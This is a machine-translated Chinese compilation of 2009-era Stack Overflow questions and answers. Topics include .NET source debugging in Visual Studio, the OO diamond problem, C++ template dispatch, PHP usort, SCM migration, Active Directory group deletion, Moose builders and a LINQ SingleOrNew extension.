不知何故，我的 VS2008 SP1 失去了进入 .NET 框架源代码的能力。我一直在玩复选框。我已经多次重新删除了 Symbol 缓存文件夹；我已经尝试过各种调试符号服务器。

它所做的只是下载一些 .PDB 文件，但是当我尝试在 .NET 中选择堆栈帧时，我总是收到关于没有可用源和“你想查看反汇编”的消息。

是什么赋予了？

**新增：**网页应用；Windows Vista 商业 x32；.NET 3.5 SP1。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-19T01:35:42.080

我相信您的问题是与从符号服务器下载的 pdb 中的图像版本相比，您的系统上运行的 .Net 版本不匹配。我在 64 位 Vista 和 Win7 上遇到了同样的问题。我还没有找到有关如何按照说明将程序集安装到 2.0.5.xxxx 的参考。SP1 与我 indacated 的两个操作系统上的所有服务包显示在 2.0.0.xxxx 的程序集

编辑：开始调试您拥有的任何应用程序，然后按 CTRL+ALT+U 以获取模块列表。它显示应用程序正在使用 GAC 中的哪个程序集

我在博客上写了我认为更好地描述问题的内容。 [问题博客](http://jmcecil.blogspot.com/2009/02/vs-net-symbol-issue-with-sp1.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T18:56:36.797

进入调试模式后，打开 Modules 窗口，右键单击框架组件并选择从 Microsoft 服务器加载源代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-01-06T03:50:40.623

我遇到了无法进入框架源代码的问题。

然后我进入项目设置，将目标平台设置为“任何 CPU”，然后魔法发生了，默认目标平台设置为“x86”。

我的平台Win7 x64，VS2010

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T20:47:59.867

我在 2005 年遇到过几次这种情况。其中大部分是伏都教，可能无关紧要，但这里的某个地方是答案（对我有用）：

1.  杀死服务
2.  删除任何本地 .pdbs
3.  摆脱（例如）C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files 中的临时文件（只是与项目相关的文件或所有文件）
4.  重启服务
5.  如果这不起作用，请重复 1-4，重新启动然后尝试

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T22:40:05.760

我注意到，如果您在运行网站时出现此问题，在 IIS 中启用 HTTP keep-alives 可以解决它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-19T01:38:22.837

试试[这个](http://blogs.msdn.com/sburke/archive/2008/01/16/configuring-visual-studio-to-debug-net-framework-source-code.aspx)指令，我得到了一切正常！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-10-14T23:45:37.627

我在不同的机器上遇到了同样的问题。我现在在带有 .NET v2.0.50727 CLR (3.5sp1) 的 Win7 x86 上得到它。引用最多[的帖子](http://blogs.msdn.com/sburke/archive/2008/01/16/configuring-visual-studio-to-debug-net-framework-source-code.aspx)没有帮助。请注意，“Microsoft 符号服务器”不是具有 .NET 源的源服务器。它托管没有源信息（非索引）的 PDB。[对于 .NET 源，我们需要来自“ http://referencesource.microsoft.com/symbols](http://referencesource.microsoft.com/symbols) ”的索引 PDB并启用源服务器支持。但有时它会停止工作。我想无法下载索引.net 的 PDB（如前所述）的问题与版本冲突有关。

我只能这样说：

WinServer 2008 R2 3.5.30729.4926 - 工作

Win7 x86 3.5.30729.4918 - 不起作用

我所说的“不起作用”是什么意思：尝试“从符号路径加载”（从模块或堆栈窗口，没关系）并获取选择 .pdb 的对话框（位于例如 C:\Windows\assembly\GAC_32 \mscorlib\2.0.0.0__b77a5c561934e089\mscorlib.pdb ）。那就是VS无法为dll下载pdb。WinSrv2008r2 上的绝对相同操作使 VS 下载 pdb 和（如果启用了源服务器支持）源。

# design-patterns - 钻石问题真的能解决吗？

> ID：561729
> 
> 赞同：17
> 
> 时间：2009-02-18T16:04:43.933
> 
> 标签：design-patterns, oop, anti-patterns

OO 编程中的一个典型问题是菱形问题。我有两个子类 B 和 C 的父类 A。A 有一个抽象方法，B 和 C 实现它。现在我有一个子类 D，它继承了 B**和**C。菱形问题现在是，D 应该使用什么实现，B 的一个还是 C 的一个？

人们声称 Java 不知道钻石问题。我只能对接口进行多重继承，因为它们没有实现，所以我没有钻石问题。这是真的吗？我不这么认为。**见下文：**

[移除车辆示例]

钻石问题是否总是导致糟糕的类设计以及程序员和编译器都不需要解决的问题，因为它本来就不应该存在？

* * *

更新：也许我的例子选择不当。

看到这张图片

[![钻石问题](https://i.stack.imgur.com/JM4Vv.png)](https://i.stack.imgur.com/JM4Vv.png)
[（来源：[suffolk.edu](http://cartan.cas.suffolk.edu/oopdocbook/opensource/src/multinheritance/PersonStudentTeacher.png)）]

当然，您可以在 C++ 中将 Person 设为虚拟，因此内存中只有一个 person 实例，但恕我直言，真正的问题仍然存在。您将如何为 GradTeachingFellow 实施 getDepartment()？考虑一下，他可能是一个部门的学生并在另一个部门任教。因此，您可以返回一个部门或另一个部门；这个问题没有完美的解决方案，而且没有实现可能被继承（例如，学生和教师都可以是接口）这一事实似乎并不能解决我的问题。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-02-18T16:14:55.297

您所看到的是如何违反[Liskov 替换原则](http://en.wikipedia.org/wiki/Liskov_substitution_principle)使得拥有一个有效的、逻辑的面向对象结构变得非常困难。
基本上，（公共）继承应该只缩小类的用途，而不是扩展它。在这种情况下，通过继承两种类型的车辆，您实际上是在扩展目的，并且正如您所注意到的，它不起作用 - 水上车辆的移动与公路车辆的移动应该非常不同。
您可以改为在您的两栖车辆中聚合水上车辆和地面车辆对象，并从外部决定两者中的哪一个适合当前情况。
或者，您可以决定“车辆”类是不必要的通用类，并且您将拥有两个单独的接口。但这并不能单独解决您的两栖车辆的问题 - 如果您在两个界面中都调用移动方法“移动”，您仍然会遇到麻烦。所以我建议聚合而不是继承。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-18T16:14:46.670

`C#`有[明确的接口实现](http://msdn.microsoft.com/en-us/library/aa288461(VS.71).aspx)来部分处理这个。至少在您拥有其中一个中间接口（其中一个对象..）的情况下

然而，可能会发生的是 AmphibianVehicle 对象知道它当前是在水上还是陆地上，并且做正确的事情。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-02-18T18:01:24.323

在您的示例中，`move()`属于`Vehicle`接口并定义了“从 A 点到 B 点”的合同。

当`GroundVehicle`和`WaterVehicle`扩展时`Vehicle`，它们隐式地继承了这个契约（类比：`List.contains`继承它的契约`Collection.contains`——想象一下，如果它指定了不同的东西！）。

所以在具体`AmphibianVehicle`实施的时候`move()`，它真正需要尊重的是契约`Vehicle`。有一颗钻石，但无论您考虑钻石的一侧还是另一侧（或者我称之为设计问题），合同都不会改变。

如果您需要“移动”契约来体现表面的概念，请不要将其定义为不模拟此概念的类型：

```
public interface GroundVehicle extends Vehicle {
    void ride();
}
public interface WaterVehicle extends Vehicle {
    void sail();
} 
```

（类比：`get(int)`的合约由`List`接口定义。它不可能由 定义`Collection`，因为集合不一定是有序的）

或者重构您的通用接口以添加概念：

```
public interface Vehicle {
    void move(Surface s) throws UnsupportedSurfaceException;
} 
```

我在实现多个接口时看到的唯一问题是来自完全不相关接口的两个方法碰巧发生冲突：

```
public interface Vehicle {
    void move();
}
public interface GraphicalComponent {
    void move(); // move the graphical component on a screen
}
// Used in a graphical program to manage a fleet of vehicles:
public class Car implements Vehicle, GraphicalComponent {
    void move() {
        // ???
    }
} 
```

但这不会是钻石。更像是一个倒三角形。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-18T16:12:56.330

> 人们声称 Java 不知道钻石问题。我只能对接口进行多重继承，因为它们没有实现，所以我没有钻石问题。这是真的吗？

是的，因为您在 D 中控制接口的实现。两个接口（B/C）之间的方法签名是相同的，并且看到接口没有实现 - 没有问题。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-02-18T16:13:27.140

我不懂Java，但是如果接口B和C继承自接口A，而D类实现了接口B和C，那么D类只实现了一次move方法，它应该实现的是A.Move。正如您所说，编译器对此没有问题。

从您给出的有关实现 GroundVehicle 和 WaterVehicle 的 AmphibianVehicle 的示例中，可以通过存储对 Environment 的引用来轻松解决这个问题，例如，并在 Environment 上公开 AmphibianVehicle 的 Move 方法将检查的 Surface 属性。无需将此作为参数传递。

从某种意义上说，您是对的，这是程序员要解决的问题，但至少它可以编译并且不应该是“问题”。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-02-18T16:15:55.357

基于接口的继承不存在钻石问题。

使用基于类的继承，多个扩展类可以有不同的方法实现，因此对于在运行时实际使用哪种方法存在歧义。

对于基于接口的继承，该方法只有一个实现，因此没有歧义。

编辑：实际上，对于在超类中声明为 Abstract 的方法，这同样适用于基于类的继承。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-02-18T16:21:11.350

> 如果我知道有一个继承了 GroundVehicle 和 WaterVehicle 的 AmphibianVehicle 接口，我将如何实现它的 move() 方法？

您将提供适合`AmphibianVehicle`s 的实现。

如果 a`GroundVehicle`移动“不同”（即采用与 a 不同的参数`WaterVehicle`），则`AmphibianVehicle`继承两种不同的方法，一种用于水上，一种用于地面。如果这是不可能的，那么不应该从and`AmphibianVehicle`继承。`GroundVehicle``WaterVehicle`

> 钻石问题是否总是导致糟糕的类设计以及程序员和编译器都不需要解决的问题，因为它本来就不应该存在？

如果是由于糟糕的类设计，那就是程序员需要解决它，因为编译器不知道如何解决。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2010-04-26T23:07:42.497

您在学生/教师示例中看到的问题仅仅是您的数据模型错误，或者至少不够充分。

Student 和 Teacher 类通过使用相同的名称来将两个不同的“部门”概念混为一谈。如果你想使用这种继承，你应该在 Teacher 中定义“getTeachingDepartment”，在 Student 中定义“getResearchDepartment”。既是教师又是学生的 GradStudent 实现了两者。

当然，考虑到研究生院的现实，即使是这种模式也可能是不够的。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-02-18T16:20:58.713

我认为阻止具体的多重继承不会将问题从编译器转移到程序员身上。在您给出的示例中，程序员仍然需要向编译器指定要使用的实现。编译器无法猜测哪个是正确的。

对于您的两栖类，您可以添加一个方法来确定车辆是在水上还是在陆地上，并使用它来决定要使用的移动方法。这将保留无参数接口。

```
move()
{

  if (this.isOnLand())
  {
     this.moveLikeLandVehicle();
  }
  else
  {
    this.moveLikeWaterVehicle();
  }
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-02-18T16:30:15.323

在这种情况下，将 AmphibiousVehicle 作为 Vehicle 的子类（WaterVehicle 和 LandVehicle 的兄弟）可能是最有利的，这样可以从一开始就完全避免这个问题。无论如何，这可能会更正确，因为两栖车辆不是水上车辆或陆地车辆，它完全是另一回事。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-02-18T19:33:49.220

如果 move() 具有基于它是 Ground 或 Water 的语义差异（而不是 GroundVehicle 和 WaterVehicle 接口本身都扩展了具有 move() 签名的 GeneralVehicle 接口），但预计您将混合和匹配地面和水实施者，那么您的示例一实际上是设计不佳的 api 之一。

真正的问题是名称冲突实际上是偶然的。例如（**非常**合成）：

```
interface Destructible
{
    void Wear();
    void Rip();
}

interface Garment
{
    void Wear();
    void Disrobe();
} 
```

如果你有一件夹克，你希望它既是一件衣服，又是可破坏的，你将在（合法命名的）穿着方法上发生名称冲突。

Java 对此没有解决方案（其他几种静态类型语言也是如此）。动态编程语言也会有类似的问题，即使没有菱形或继承，它也只是名称冲突（Duck Typing 固有的潜在问题）。

.Net 具有[显式接口实现](http://msdn.microsoft.com/en-us/library/aa288461(VS.71).aspx)的概念，其中一个类可以定义两个具有相同名称和签名的方法，只要它们都被标记为两个不同的接口。调用相关方法的确定基于变量的编译时已知接口（或者如果通过被调用者的显式选择进行反射）

这种合理的、可能的名称冲突很难发生，而且 java 并没有因为不提供显式接口实现而被嘲笑为无法使用，这表明这个问题对于现实世界的使用来说并不重要。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-02-18T16:14:44.487

我意识到这是一个特定的实例，而不是一般的解决方案，但听起来您需要一个额外的系统来确定状态并决定车辆将执行哪种 move()。

似乎在两栖车辆的情况下，调用者（比如说“油门”）不知道水/地面的状态，但是像“传输”这样的中间确定对象与“牵引力控制”相结合可能弄清楚，然后使用正确的参数 move(wheels) 或 move(prop) 调用 move()。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-02-18T16:16:30.427

问题确实存在。在示例中，AmphibianVehicle-Class 需要另一个信息 - 表面。我首选的解决方案是在 AmpibianVehicle 类上添加一个 getter/setter 方法来更改表面成员（枚举）。实现现在可以做正确的事情，并且类保持封装状态。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-02-18T16:23:12.610

您可以在 C++（允许多重继承）中遇到菱形问题，但在 Java 或 C# 中则不行。没有办法从两个类继承。在这种情况下，用相同的方法声明实现两个接口并不意味着，因为具体的方法实现只能在类中进行。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-02-18T20:13:32.290

C++ 中的菱形问题已经解决：使用虚拟继承。或者更好的是，不要偷懒，在不必要（或不可避免）时继承。至于你给出的例子，这可以通过重新定义能够在地面或水中驾驶的含义来解决。在水中移动的能力真的定义了水基车辆还是仅仅是车辆能够做的事情？我宁愿认为你描述的 move() 函数背后有某种逻辑，询问“我在哪里，我真的可以搬到这里吗？” 相当于一个`bool canMove()`功能取决于当前状态和车辆的固有能力。你不需要多重继承来解决这个问题。只需使用一个 mixin，它会根据可能的情况以不同的方式回答问题，并将超类作为模板参数，因此虚拟 canMove 函数将通过继承链可见。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2010-04-26T07:49:08.463

实际上，如果`Student`和`Teacher`都是接口，它实际上确实解决了您的问题。如果它们是接口，那么`getDepartment`只是一个必须出现在您的`GradTeachingFellow`类中的方法。`Student`和接口都强制执行该接口的事实`Teacher`根本不是冲突。`getDepartment`在您的类中实现`GradTeachingFellow`将满足两个接口，而不会出现任何菱形问题。

但是，正如评论中指出的那样，这并不能解决一个部门的`GradStudent`教学/[助教](http://en.wikipedia.org/wiki/Teaching_assistant)，以及另一个部门的学生的问题。封装可能是您想要的：

```
public class Student {
  String getDepartment() {
    return "Economics";
  }
}

public class Teacher {
  String getDepartment() {
    return "Computer Engineering";
  }
}

public class GradStudent {
  Student learning;
  Teacher teaching;

  public String getDepartment() {
    return leraning.getDepartment()+" and "+teaching.getDepartment(); // or some such
  }

  public String getLearningDepartment() {
    return leraning.getDepartment();
  }

  public String getTeachingDepartment() {
    return teaching.getDepartment();
  }
} 
```

与在概念上没有“拥有”老师和学生无关紧要`GradStudent`- 封装仍然是要走的路。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2011-02-07T07:35:45.767

接口 A { void add(); }

接口 B 扩展 A { void add(); }

接口 C 扩展 A { void add(); }

D类实现B，C {

}

是不是钻石问题。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2021-07-02T10:11:16.713

## 组合优于继承

（答案太多了，但因为这还没有出现）

通常，这些类型的问题和最突出的“致命钻石”通过使用组合（a 类*具有* **x** *, y, z*）而不是继承（a 类*是* **x** *, y, z*）来解决/绕过。

## 是否已解决/与什么有关？

*   你是对的，关于你的设计，这并不能解决多继承的问题。一种能够为子类（或子类）“重新标记”基本方法的语言可能会解决这个问题（至少对于直接调用，当向下转换时这仍然存在问题；请参阅其他尝试进一步向下）。
*   关于（Java）语言，这实际上已经解决了。编译器（甚至开发人员）很清楚，两种接口方法（同名和签名）都只能通过一个方法实现。

## 进一步的实践思考

尽管如此，在使用组合时，这两种情况都得到了解决，但是这可能有点不方便，例如在 Java 中，因为（在那里）你不能直接使用`mySpecificGradTeachingStudent.getName()`.

*   几种语言（例如**Go**）如果模棱两可（类似于 `this.Student.getDepartment`），则需要基本类型，从思维方式来看，这已经朝着组合的方向发展（超过继承）。

*   类似地，其他语言（例如**Rust**）更进一步并使用所谓的**特征**代替（完全消除继承）。意味着结构实现了**TraitA**和**TraitB**，而不是“成为 A 和/或 B”。

*   由于所有这些想法基本上都建立在“接口概念”和（简化）向组合中添加语法糖（恕我直言，这确实是要走的路，并且也解决了其他问题，例如对象在几层继承后完全改变），这里最后一次（非常）不同的尝试。任何（多继承）语言都可以简单地添加**优先级**的概念。意思是，（例如）第一个实现的基本组件/类将是提供其方法堆栈的那个（即`Student`），而其他方法则被简单地忽略。这仍然会引发类似这样的问题：“当被特别沮丧到一个`Teacher`对象时会发生什么，但即使是这些情况也可能被惯例所掩盖。（**注意：**从设计的角度来看，这可能不是最直观的解决方案，但对于语言规范来说仍然是一个简单的解决方案。）

最后，参考学生/教师示例中的一些想法（与龙类似的细微偏差）：[https ://dev.to/thisismahmoud/composition-over-inheritance-4fn9](https://dev.to/thisismahmoud/composition-over-inheritance-4fn9)

# c++ - 动态调度的部分模板特化

> ID：561730
> 
> 赞同：2
> 
> 时间：2009-02-18T16:04:53.760
> 
> 标签：c++, templates, partial-specialization

我正在尝试为在整数值（而不是类型）上模板化的函数编写动态调度程序。虽然我可以编写代码生成器或使用大型宏链来创建调度程序源，但模板化解决方案似乎更优雅。

我已经将我的调度程序简化为一个简单的形式（实际上并没有进行任何调度）：

```
// works fine with full template specialization
template <int N>
struct TestDispatcher1D {
  int f(int n) {
    if (n == N) return n; // replace me with actual dispatch
    TestDispatcher1D<N-1> t;
    return t.f(n);
  }
};

template<>
struct TestDispatcher1D<-1> {
  int f(int n) { return -1; }
};

// partial template specialization is problematic
template <int M, int N>
struct TestDispatcher2D {
  int f(int m, int n);
};

template<int M>
struct TestDispatcher2D<M,-1> {
  int f(int m, int n) { return -1; }
};

template<int N>
struct TestDispatcher2D<-1,N> {
  int f(int m, int n) { return -1; }
};

template<>
struct TestDispatcher2D<-1,-1> {
  int f(int m, int n) { return -1; }
};

template <int M, int N>
int TestDispatcher2D<M,N>::f(int m, int n) {
  if ((n == N) && (m == M)) return n + m; // replace me with actual dispatch
  if (m < M) {
    if (n < N) {
      TestDispatcher2D<M-1,N-1> t;
      return t(m,n);
    } else {
      TestDispatcher2D<M-1,N> t;
      return t(m,n);
    }
  } else {
    TestDispatcher2D<M,N-1> t;
    return t(m,n);
  }
}

// test code
void testIt() {
  { 
    TestDispatcher1D<16> t; 
    t.f(16); 
  }
  {
    TestDispatcher1D<16>t; 
    t.f(0);
  }
  {
    TestDispatcher2D<16,16>t; 
    t.f(8,8);
  }
} 
```

在 gcc 4.1.1 上编译它时，我收到以下错误：

```
t.cpp：在成员函数'int TestDispatcher2D::f(int, int) [with int M = 16, int N = 16]'中：
t.cpp:63：从这里实例化
t.cpp:40: 错误: 调用 '(TestDispatcher2D) (int&, int&)' 不匹配
t.cpp:63：从这里实例化
t.cpp:43: 错误: 调用 '(TestDispatcher2D) (int&, int&)' 不匹配
t.cpp:63：从这里实例化
t.cpp:47: 错误: 调用 '(TestDispatcher2D) (int&, int&)' 不匹配

```

显然，当我尝试创建递归对象时，编译器并没有将其视为实例化新模板的请求。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T16:15:08.900

您只是没有`f()`在递归调用中调用该函数，而是在尝试“调用对象”：

你写：

```
TestDispatcher2D<...> t;
return t(m,n); 
```

但你想要：

```
TestDispatcher2D<...> t;
return t.f(m,n); 
```

# html - Web 应用程序模板

> ID：561731
> 
> 赞同：31
> 
> 时间：2009-02-18T16:04:56.710
> 
> 标签：html, web-applications, templates, user-interface

我正在寻找专门为 Web 应用程序制作的模板

## Web 应用程序模板列表

**有薪酬的**

[主题森林 - 便宜，有很多选择](http://themeforest.net/category/site-templates/admin-templates)

[粘糊糊的模板](http://www.gooeytemplates.com/)

~~[获取 DevBox](http://www.getadevbox.com/)~~（不可用）

**自由**

[Bloganje](http://www.bloganje.com/free-admin-template.html)（不工作）

[转介](https://github.com/zapnap/transdmin)

[网络资源库](http://www.webresourcesdepot.com/free-admin-template-for-web-applications/)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2010-11-22T07:36:40.863

[https://github.com/pilu/web-app-theme](https://github.com/pilu/web-app-theme)绝对令人惊叹并积极开发。:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-01-23T12:14:06.420

WebResourcesDepot 是我开发的。

但是，就我个人而言，我在我的项目中使用[http://www.admintemplates.com](http://www.admintemplates.com)，它具有一次购买、始终使用的许可证，比 ThemeForest 的扩展许可证便宜得多。

它有一个非常简单、灵活的代码，并且不像许多其他的那样臃肿。

# sql - 多对多进汇总栏

> ID：561732
> 
> 赞同：0
> 
> 时间：2009-02-18T16:05:03.730
> 
> 标签：sql, ms-access

我有一个这样的数据库：

```
Accounts 
--------
id
BankName
AcctNumber
Balance

AccountGroups
-------------
id
GroupName

JoinAccountsGroups
------------------
aid
gid 
```

我正在尝试生成这样的数据：

```
Bank       AcctNum       Balance    Groups
--------|--------------|----------|----------------
Citi       930938        400        Payroll
B of A     8372933       100        Monthly, Payroll
Wells      09837         800        -
Chase      8730923       250        Monthly 
```

是否有一种简单的方法可以在 sql 查询中生成该 Groups 列，它将连接的结果组合成一个逗号分隔的字段？我目前正在使用每行的辅助查询在 php 端进行处理，因为我正在处理它。对于一个小数据集来说这很好，但它似乎效率很低......

我正在使用 php > jet > ms 访问 .mdb 文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T16:10:53.450

这可能会有所帮助[MS access(2003) 是否有任何与存储过程相当的东西。我想在 MS 访问中运行一个复杂的查询](https://stackoverflow.com/questions/230241/does-ms-access2003-have-anything-comparable-to-stored-procedure-i-want-to-run)

# php - 为什么这个 usort() 函数在某些版本的 PHP 上会失败？

> ID：561734
> 
> 赞同：0
> 
> 时间：2009-02-18T16:05:48.783
> 
> 标签：php, arrays, usort

我们编写了一些涉及 usort 的代码，这些代码在我们的开发系统 (PHP 5.2.8) 上运行良好，但在我们的实时系统 (PHP 5.2.0) 上遇到了问题：

```
// Sort by distance
usort($locations, 'Interpolator::sortByDistance'); 
```

调用方法（在同一个类 Interpolator 中）：

```
private static function sortByDistance($a, $b) {
    $return = 0;
    if($a['distance'] > $b['distance']) {
        $return = 1;
    } else if ($a['distance'] < $b['distance']) {
        $return = -1;
    }
    return $return;
} 
```

在我们的实时系统上，这会返回一个完全任意排序的数组，原来的顺序被打乱了，但仍然没有按距离排序。

我找不到与此问题相关的在 5.2.0 和 5.2.8 之间修复的 PHP 错误的任何引用。

这个问题可能来自哪里？我可以自己写一个排序函数来解决这个问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T16:23:59.270

我能想到的唯一想法是你应该使用这个：

```
usort($locations, array('Interpolator', 'sortByDistance')); 
```

# git - 对于 SUN Teamware -> 现代 SCM 迁移，可以向客户/老板提出哪些论据？

> ID：561735
> 
> 赞同：3
> 
> 时间：2009-02-18T16:05:56.410
> 
> 标签：git, mercurial, versioning, version-control, sun

我工作的团队仍然使用[SUN Teamware](http://en.wikipedia.org/wiki/TeamWare)进行源代码管理 (SCM)。我已经使用它一段时间了（超过 10 个月），我对它没有任何特别的抱怨。

Teamware 已被用于管理 Sun 最大的源代码树，包括用于 Solaris 操作系统和 Java 系统的源代码树，并且运行良好。但它也是一个已经停产的旧商业（闭源）产品。这是 Sun 将其代码库转换为开源社区的过程的一部分，这反过来又导致转向更新的版本控制系统，例如 Mercurial。

这让我感觉有点像我们在使用 Teamware 时陷入了困境，而世界已经转向更新的系统。然而，我并没有错过任何特定的功能，除了可能有一个源树的 Web 视图来浏览和查看文件的历史记录（我们用 VersionTool 做的事情并不重要）。

使用 SUN Teamware 的团队是否应该迁移到更现代的 SCM，例如 git 或 Mercurial？

更重要的是，你可以向团队的其他成员提出什么论据来支持这种转变？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T16:38:16.113

您是否看到 Sun 所做的评估：

*   **[git](http://opensolaris.org/os/community/tools/scm/git-eval.txt)**（注意他们评估了一个旧的 1.2.4 版本。要点：FAST），
*   **[Mercurial](http://opensolaris.org/os/community/tools/scm/mercurial-eval.html)** (), 和
*   **[市场](http://opensolaris.org/os/community/tools/scm/bzr-eval/)**

作为 Solaris 代码库替换 Sun Teamware VCS 的候选者？

在考虑迁移时，这可能会提供一些关于要评估的主题的想法。

[此Git 调查 2007-2008](http://git.or.cz/gitwiki/GitSurvey2007)中列出了其他一些主题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:11:29.813

我是 SCM 的忠实粉丝，但我不得不说，如果它没有坏，就不要修复它。在 Teamware 不再满足您的需求之前，请继续使用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T16:38:05.523

在字里行间，我想即使你也没有真正的论据，除了当前趋势留下的个人感觉。不幸的是，这并不是将大型代码库从一个 SCM 迁移到另一个的论据。

我想保持最新，你仍然可以在家里玩 git/Mercurial/Bazaar。

# .net - 如何从 .NET 中的 Active Directory 中删除安全组？

> ID：561737
> 
> 赞同：1
> 
> 时间：2009-02-18T16:06:14.053
> 
> 标签：.net, active-directory

如何从 .NET 中的 Active Directory 中删除安全组？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T16:17:07.930

在 .NET 3.5 中，您可以使用新的命名空间`System.DirectoryServices.AccountManagement`并尝试以下操作：

```
var SecurityContext= new PrincipalContext(ContextType.Domain);
var TheGroup = GroupPrincipal.FindByIdentity(SecurityContext, "GROUP_NAME");
TheGroup.Delete(); 
```

显然，运行代码的用户需要具有删除权限。

# perl - 为什么 Moose 的 builder 取一个字符串值？

> ID：561758
> 
> 赞同：7
> 
> 时间：2009-02-18T16:10:44.217
> 
> 标签：perl, moose

[Moose::Manual::Attributes](http://search.cpan.org/~drolsky/Moose-0.70/lib/Moose/Manual/Attributes.pod)状态：

> 作为使用子例程引用 [默认] 的替代方法，您可以为您的属性提供一个构建器方法： ... 这有几个优点。首先，它将一大块代码移动到自己的命名方法中，这提高了可读性和代码组织。

因此，您的属性可以这样定义一个默认值：

```
has attr => (
  is => 'ro',
  builder => 'subroutine'
);
sub subroutine {
  # figure out and return default value
} 
```

我不明白为什么这必须与默认值分开。您不能只传递对命名子例程的引用吗？

```
has attr => (
  is => 'ro',
  default => \&subroutine
); 
```

这不是更好的编程实践吗，因为保证不会意外引用不存在的子例程？您将使用逻辑引用而不是符号引用来引用该方法。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-02-18T16:15:00.197

调用构建器时，会发生这种情况：

```
$object->$builder 
```

如果 builder 是一个字符串（比如说`build_attr`），那么用户可以在子类中编写自己的 build_attr 方法，然后调用它。这使得默认值可以通过简单的命名方法机制进行扩展。

如果它是对子例程的引用，则该引用是在原始类的包中获取的，这意味着它不能以相同的方式被覆盖。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-02-18T16:14:48.417

这不是一个“象征性”的参考。builder 是一个方法*名*。这意味着它可以从角色继承和组合。如果您传递子例程引用，则该引用必须存在于同一包中（或完全限定）。

我很确定我在手册中对此进行了解释。不清楚吗？

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-02-18T16:15:35.717

子类化。

Builder 指定要调用的方法名称，因此

```
package Something;
use Moose;

extends 'YourClass';

sub subroutine { <some other default> } 
```

会为“子程序”的构建器调用Something::subroutine，而如果您使用subref样式，则将调用YourClass::subroutine，因为您直接引用了子程序而不是让它通过方法派遣。

# c# - LINQ 中的 SingleOrNew() 方法而不是 SingleOrDefault() 怎么样？

> ID：561762
> 
> 赞同：10
> 
> 时间：2009-02-18T16:11:23.637
> 
> 标签：c#, linq

该`SingleOrDefault()`方法很棒，因为如果您调用它的集合为空，它不会引发异常。但是，有时我想要的是在什么都不存在的情况下获得某种类型的新对象。例如，如果我能做到以下几点那就太好了：

```
var client = db.Clients
    .Where(c => c.Name == "Some Client")
    .SingleOrNew<Client>(); 
```

这样我就不必检查它是否是`null`，如果它是创建一个新的，我总是知道我的`client`对象将是我可以立即使用的东西。

有任何想法吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2009-02-18T16:18:08.830

实际上，您只想在此处使用[空合并](http://msdn.microsoft.com/en-us/library/ms173224.aspx)运算符。例子：

```
var client = db.Clients
    .Where(c => c.Name == "Some Client")
    .SingleOrDefault() ?? new Client(); 
```

这将返回 SingleOrDefault 返回的任何内容，除非 SingleOrDefault 返回 null，否则表达式将返回 new Client()。

**编辑：**正如 John Skeet 指出的那样，这个解决方案并没有区分没有匹配项和找到空元素的情况，尽管很明显这在很多情况下不一定是一个*问题。*另一种方法是创建一个扩展方法，如下所示。

```
public static T SingleOrNew<T>(this IEnumerable<T> query) where T : new()
{
    try
    {
        return query.Single();
    }
    catch (InvalidOperationException)
    {
        return new T();
    }
} 
```

我想说这可能是在一般情况下最优雅的解决方案。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-02-18T17:26:53.860

如果您想要完成的只是覆盖默认值（并返回一个新对象），您可以通过在调用[SingleOrDefault()之前使用](http://msdn.microsoft.com/en-us/library/bb342451.aspx)[DefaultIfEmpty()](http://msdn.microsoft.com/en-us/library/bb355419.aspx)方法来实现。就像是：

```
var client = db.Clients
    .Where(c => c.Name == name)
    .DefaultIfEmpty(new Client { Name = name })
    .SingleOrDefault(); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-18T16:22:46.887

这行吗？ **编辑**原来是这样？？不适用于泛型类型。

```
public static class IEnumerableExtensions
{
    public static T SingleOrNew<T>( this IEnumerable<T> query ) where T : new()
    {
        var value = query.SingleOrDefault();
        if (value == null)
        {
            value = new T();
        }
        return value;
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T16:16:22.877

听起来可以做到，是的。不能说我记得自己曾经使用过它，但它很容易实现。像这样的东西：

```
public static T SingleOrNew<T>(this IEnumerable<T> source) where T : new()
{
    if (source == null)
    {
        throw new ArgumentNullException("source"); 
    }
